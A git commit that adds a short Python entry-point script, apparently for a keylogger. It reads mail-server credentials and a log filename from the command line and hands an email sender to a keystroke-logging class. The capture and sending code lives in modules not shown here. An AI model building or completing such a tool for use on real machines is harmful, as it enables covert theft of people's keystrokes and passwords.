22eede4e2deefc139424c032d5b5781fae5d7652
kzu-sudo <80857205+kzu-sudo@users.noreply.github.com>
2021-04-25 22:23:01 +0200

    Create __main__.py

---
+++ __main__.py
@@ -0,0 +1,21 @@
+#!/bin/python3.8
+
+import threading
+
+from log_to_file import Key
+from send_email_using_python import Send_Email
+from parser import Parser
+
+def main():
+
+    arguments = Parser.parse_arguments()
+    f = Send_Email(arguments["server"], arguments["port"],\
+                   arguments["sender"], arguments["password"],\
+                   arguments["filename"])
+
+
+    k = Key(arguments["filename"])
+    k.some_f(f)
+
+if __name__ == '__main__':
+    main()
